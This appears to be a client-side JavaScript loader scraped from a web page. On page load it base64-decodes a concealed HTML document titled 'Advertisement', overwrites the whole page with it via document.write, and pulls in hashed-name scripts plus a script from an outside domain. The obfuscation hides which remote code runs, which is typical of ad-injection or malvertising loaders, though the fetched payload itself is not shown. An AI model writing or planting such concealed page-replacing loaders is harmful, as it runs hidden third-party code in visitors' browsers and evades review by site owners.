(async () => {
  await new Promise(e => {
    const t = () => setTimeout(e, 0);
    if (document.readyState === "complete") t(); else window.addEventListener("load", t, {
      once: true
    });
  });
  const e = (new TextDecoder).decode(Uint8Array.from(atob([ "PCFkb2N0eXBlIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiPjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0", "aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xIj48dGl0bGU+QWR2ZXJ0aXNlbWVudDwvdGl0bGU+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46", "MDtwYWRkaW5nOjA7YmFja2dyb3VuZDowIDA7d2lkdGg6MzIwcHg7aGVpZ2h0OjI2MHB4O292ZXJmbG93OmhpZGRlbn1pZnJhbWV7Ym9yZGVyOjB9", "PC9zdHlsZT48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSIvanMvQHI5MDY5NWE1ZmJhMTRjZmVmMTk0MWUwYzMhLmpzIj48L3NjcmlwdD4gPC9o", "ZWFkPjxib2R5PjxzY3JpcHQgc3JjPSIuL0ByYTIzMDZmNmNjMDEzNTM0OWIzMGFmZTdlIS5qcyI+PC9zY3JpcHQ+PHNjcmlwdCBkYXRhLWNmYXN5", "bmM9ImZhbHNlIiBzcmM9Imh0dHBzOi8vYmljZWEub3JnLzE0L2IwYjFjMjVjNGFlNzU2MWNjNDk5ZDEwY2YxZWI4OGZkIj48L3NjcmlwdD48L2Jv", "ZHk+PC9odG1sPiAK" ].join("")), e => e.charCodeAt(0)));
  const t = document.querySelector("base")?.outerHTML || "";
  document.open();
  document.write(e.replace(/<head(?:\s[^>]*)?>/i, e => e + t));
  document.close();
})().catch(() => {
  const e = document.createElement("p");
  e.setAttribute("role", "alert");
  e.textContent = "This page could not be loaded. Please reload to try again.";
  document.body.prepend(e);
});